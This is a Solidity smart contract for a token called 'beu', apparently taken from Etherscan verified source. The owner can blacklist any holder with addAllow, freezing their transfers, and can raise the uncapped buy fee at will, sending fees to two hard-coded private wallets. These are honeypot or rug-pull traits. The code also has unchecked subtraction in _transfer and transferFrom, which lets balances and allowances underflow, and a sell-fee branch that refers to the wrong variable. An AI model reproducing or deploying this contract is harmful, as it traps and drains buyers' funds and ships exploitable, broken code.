/**
 *Submitted for verification at Etherscan.io on 2021-11-19
*/

pragma solidity 0.4.25;
library SafeMath {
	/**
	 * @dev Returns the addition of two unsigned integers, reverting on
	 * overflow.
	 *
	 * Counterpart to Solidity's `+` operator.
	 *
	 * Requirements:
	 *
	 * - Addition cannot overflow.
	 */
	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	/**
	 * @dev Returns the subtraction of two unsigned integers, reverting on
	 * overflow (when the result is negative).
	 *
	 * Counterpart to Solidity's `-` operator.
	 *
	 * Requirements:
	 *
	 * - Subtraction cannot overflow.
	 */
	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		return sub(a, b, "SafeMath: subtraction overflow");
	}

	/**
	 * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
	 * overflow (when the result is negative).
	 *
	 * Counterpart to Solidity's `-` operator.
	 *
	 * Requirements:
	 *
	 * - Subtraction cannot overflow.
	 */
	function sub(
		uint256 a,
		uint256 b,
		string memory errorMessage
	) internal pure returns (uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;
		return c;
	}

	/**
	 * @dev Returns the multiplication of two unsigned integers, reverting on
	 * overflow.
	 *
	 * Counterpart to Solidity's `*` operator.
	 *
	 * Requirements:
	 *
	 * - Multiplication cannot overflow.
	 */
	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		// Gas optimization: this is cheaper than requiring 'a' not being zero, but the
		// benefit is lost if 'b' is also tested.
		// See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
		if (a == 0) {
			return 0;
		}

		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}

	/**
	 * @dev Returns the integer division of two unsigned integers. Reverts on
	 * division by zero. The result is rounded towards zero.
	 *
	 * Counterpart to Solidity's `/` operator. Note: this function uses a
	 * `revert` opcode (which leaves remaining gas untouched) while Solidity
	 * uses an invalid opcode to revert (consuming all remaining gas).
	 *
	 * Requirements:
	 *
	 * - The divisor cannot be zero.
	 */
	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return div(a, b, "SafeMath: division by zero");
	}

	/**
	 * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
	 * division by zero. The result is rounded towards zero.
	 *
	 * Counterpart to Solidity's `/` operator. Note: this function uses a
	 * `revert` opcode (which leaves remaining gas untouched) while Solidity
	 * uses an invalid opcode to revert (consuming all remaining gas).
	 *
	 * Requirements:
	 *
	 * - The divisor cannot be zero.
	 */
	function div(
		uint256 a,
		uint256 b,
		string memory errorMessage
	) internal pure returns (uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		// assert(a == b * c + a % b); // There is no case in which this doesn't hold

		return c;
	}

	/**
	 * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
	 * Reverts when dividing by zero.
	 *
	 * Counterpart to Solidity's `%` operator. This function uses a `revert`
	 * opcode (which leaves remaining gas untouched) while Solidity uses an
	 * invalid opcode to revert (consuming all remaining gas).
	 *
	 * Requirements:
	 *
	 * - The divisor cannot be zero.
	 */
	function mod(uint256 a, uint256 b) internal pure returns (uint256) {
		return mod(a, b, "SafeMath: modulo by zero");
	}

	/**
	 * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
	 * Reverts with custom message when dividing by zero.
	 *
	 * Counterpart to Solidity's `%` operator. This function uses a `revert`
	 * opcode (which leaves remaining gas untouched) while Solidity uses an
	 * invalid opcode to revert (consuming all remaining gas).
	 *
	 * Requirements:
	 *
	 * - The divisor cannot be zero.
	 */
	function mod(
		uint256 a,
		uint256 b,
		string memory errorMessage
	) internal pure returns (uint256) {
		require(b != 0, errorMessage);
		return a % b;
	}
}
contract Ownable { 
  address public owner;
  
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  function Ownable() public { 
    owner = msg.sender;
  }

  modifier onlyOwner() { 
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address newOwner) public onlyOwner { 
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

}
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }

contract beu is Ownable{
    using SafeMath for uint256;
    string public name = "beu";
    string public symbol = "beu";
    uint8 public decimals = 18;
    uint256 public totalSupply = 120000000;
    
    uint256 public gameWalletFee = 30;
    uint256 public buyBackFee = 4;
    uint256 public gameWalletFee2 = 6;
    uint256 public buyBackFee2 = 4;
    
    address private _gameWalletAddress = 0x13D1943e167239EB1E8640d813e731F7aC7cE2D3;
    address private _buyBackWalletAddress = 0x07B73b6bd5023B6FdF88F99a41Fb1F0f66e1B710;
    
    mapping(address => bool) public allow;
 
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    
    address public uniswapV2Pair;
 
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed from, uint256 value);
 
 
    constructor () public {
        balanceOf[msg.sender] = totalSupply * 10 ** uint256(decimals);
    }
 
 
    function _transfer(address _from, address _to, uint _value) internal {
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }
    
    function transferDefault(address _from, address _to, uint amount) internal {
        uint256 buyTotalFees = gameWalletFee.add(buyBackFee);
        uint256 saleTotalFees = gameWalletFee2.add(buyBackFee2);
        uint256 fees = 0;
        if(_from == uniswapV2Pair){
            fees = amount.mul(buyTotalFees).div(100);
            uint game = fees.mul(gameWalletFee).div(buyTotalFees);
            _transfer(_from, _gameWalletAddress, game);
            
            uint buyback = fees.sub(game);
            _transfer(_from, _buyBackWalletAddress, buyback);
        }else if(_to == uniswapV2Pair){
            fees = amount.mul(saleTotalFees).div(100);
            
            uint games = fees.mul(gameWalletFee).div(saleTotalFees);
            _transfer(_from, _gameWalletAddress, games);
            
            uint buybacks = fees.sub(game);
            _transfer(_from, _buyBackWalletAddress, buybacks);
        }
        amount = amount.sub(fees);
        _transfer(_from, _to, amount);
    }
 
    function transfer(address _to, uint256 amount) public returns (bool) {
        require(allow[msg.sender] == false && allow[_to] == false, "You Are In Black");
        transferDefault(msg.sender, _to, amount);
        return true;
    }
 
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(allow[msg.sender] == false && allow[_to] == false, "You Are In Black");
        allowance[_from][msg.sender] -= _value;
        transferDefault(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
 
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
 
    function addAllow(address holder, bool allowApprove) onlyOwner public returns (bool success){
      allow[holder] = allowApprove;
      return true;
    }
  
    function setUniswapV2Pair(address _target) public onlyOwner{
        uniswapV2Pair = _target;
    }
      
    function setFee(uint256 fee) public onlyOwner{
        gameWalletFee = fee;
    }
}